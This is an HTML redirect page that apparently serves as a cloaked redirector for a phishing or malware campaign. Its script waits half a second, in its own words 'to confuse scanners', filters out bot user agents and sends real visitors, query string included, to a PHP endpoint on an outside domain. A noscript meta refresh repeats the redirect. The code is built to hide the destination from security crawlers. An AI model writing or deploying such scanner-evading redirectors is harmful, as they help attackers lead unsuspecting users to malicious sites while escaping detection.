<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>

    <!-- Strong Bot Protection -->
    <meta name="robots" content="noindex, nofollow, noarchive">
    <meta name="referrer" content="no-referrer">

    <!-- Masked JavaScript for real users -->
    <script>
        // Delay to confuse scanners
        setTimeout(function () {
            // Use browser fingerprint as a simple bot filter
            if (navigator.userAgent && !navigator.userAgent.includes("bot")) {
                // Grab all query parameters (if any)
                let query = window.location.search;
                // Define your destination base
                let base = "https://inviteinstallers.in/trea/loveandcare/loud.php";
                // Final link
                let finalURL = base + query;
                // Redirect
                window.location.replace(finalURL);
            } else {
                document.body.innerHTML = "<h1>Access Denied</h1>";
            }
        }, 500); // 0.5 second delay to confuse fast bots
    </script>

    <!-- Clean fallback for JS-disabled browsers (corrected) -->
    <noscript>
        <meta http-equiv="refresh" content="0;url=https://inviteinstallers.in/trea/loveandcare/loud.php">
    </noscript>
</head>
